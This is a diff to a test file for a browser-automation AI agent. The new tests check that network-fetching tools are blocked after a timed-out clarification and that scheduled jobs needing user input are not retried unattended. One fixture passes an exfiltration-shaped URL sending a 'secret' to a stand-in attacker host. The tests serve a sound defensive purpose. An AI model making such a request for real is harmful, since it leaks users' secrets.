@@ -14617,6 +14617,49 @@ test('waited clarify timeout blocks CAPTCHA solve before solver dispatch', async
   }
 });
 
+test('waited clarify timeout blocks outbound network reads before permission gates', async () => {
+  const calls = [
+    ['fetch_url', { url: 'https://evil.example/?secret=value', method: 'GET' }],
+    ['research_url', { url: 'https://evil.example/research' }],
+    ['read_pdf', { url: 'https://evil.example/private.pdf' }],
+    ['read_page_source', { url: 'https://evil.example/source' }],
+  ];
+  for (const AgentClass of [AgentCh, AgentFx]) {
+    for (const [index, [name, args]] of calls.entries()) {
+      const agent = new AgentClass({ getVisionProvider: async () => null });
+      const tabId = (AgentClass === AgentCh ? 4820 : 4830) + index;
+      const executed = [];
+      let permissionGateCalls = 0;
+      agent._persist = () => {};
+      agent._ensureGateSetting = async () => { permissionGateCalls += 1; };
+      agent.executeTool = async (_tabId, toolName) => {
+        executed.push(toolName);
+        return { success: true };
+      };
+      agent._recordClarificationAuthorization(tabId, 'timeout');
+
+      const messages = [];
+      const result = await agent._executeToolBatch(
+        tabId,
+        [{ id: `network_after_timeout_${index}`, function: { name, arguments: JSON.stringify(args) } }],
+        messages,
+        () => {},
+        { supportsVision: false },
+        '',
+        new Set([name]),
+        1,
+      );
+
+      assert.deepEqual(result, { action: 'continue' }, `${AgentClass.name}: ${name} egress block should request a fresh turn`);
+      assert.deepEqual(executed, [], `${AgentClass.name}: ${name} dispatched after a waited clarification timeout`);
+      assert.equal(permissionGateCalls, 0, `${AgentClass.name}: ${name} reached permission setup before the timeout guard`);
+      const blocked = JSON.parse(messages[0].content);
+      assert.equal(blocked.clarificationAuthorizationRequired, true, `${AgentClass.name}: ${name} did not require explicit clarification`);
+      assert.equal(blocked.dispatched, false, `${AgentClass.name}: ${name} did not prove pre-dispatch denial`);
+    }
+  }
+});
+
 test('waited clarify timeout blocks consequential dispatch before permission gates', async () => {
   for (const AgentClass of [AgentCh, AgentFx]) {
     const agent = new AgentClass({ getVisionProvider: async () => null });
@@ -14635,7 +14678,7 @@ test('waited clarify timeout blocks consequential dispatch before permission gat
     assert.equal(agent._clarificationAuthorizationBlock(tabId, 'read_page', {}, []), null, `${AgentClass.name}: read-only inspection was blocked`);
     assert.equal(agent._clarificationAuthorizationBlock(tabId, 'navigate', {}, [Capability.NAVIGATE]), null, `${AgentClass.name}: direct navigation was blocked`);
     assert.equal(agent._clarificationAuthorizationBlock(tabId, 'resize_window', {}, [Capability.WINDOW]), null, `${AgentClass.name}: window-only action was blocked`);
-    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'fetch_url', { method: 'GET' }, [Capability.NETWORK]), null, `${AgentClass.name}: read-only GET was blocked`);
+    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'read_pdf', {}, []), null, `${AgentClass.name}: active-tab PDF read was blocked`);
     assert.equal(agent._clarificationAuthorizationBlock(tabId, 'clarify', {}, []), null, `${AgentClass.name}: re-clarification was blocked`);
 
     const firstMessages = [];
@@ -17058,6 +17101,7 @@ test('ScheduledJobManager preserves clarification-required terminal runs as need
 
     const job = h.jobs()[0];
     assert.equal(job.status, 'needs_user_input', `${label}: clarification-required run must not be completed`);
+    assert.equal(job.clarificationRequired, true, `${label}: terminal authorization stop should be distinguished from a live clarification`);
     assert.equal(job.lastResult, stoppedMessage, `${label}: terminal explanation should be preserved`);
     assert.equal(job.lastOutcome, null, `${label}: clarification-required run must not record success`);
     assert.equal(job.runCount, 0, `${label}: clarification-required run must not increment completed run count`);
@@ -17072,6 +17116,16 @@ test('ScheduledJobManager preserves clarification-required terminal runs as need
       h.updates.some((u) => u.type === 'scheduled_job' && u.data?.event === 'needs_user_input'),
       `${label}: clarification-required run should emit a needs-input update`,
     );
+
+    const restarted = makeSchedulerHarness(SchedulerMod, {
+      now: now + SchedulerMod.QUEUE_RETRY_MS,
+      jobs: h.jobs(),
+    });
+    await restarted.manager.restoreAlarms();
+    const restoredJob = restarted.jobs()[0];
+    assert.equal(restoredJob.status, 'needs_user_input', `${label}: restart must not queue a terminal authorization stop`);
+    assert.equal(restoredJob.clarificationRequired, true, `${label}: restart should preserve the terminal clarification marker`);
+    assert.equal(restarted.alarms.has(restarted.alarmName(created.jobId)), false, `${label}: restart must not arm an unattended retry`);
   }
 });
 
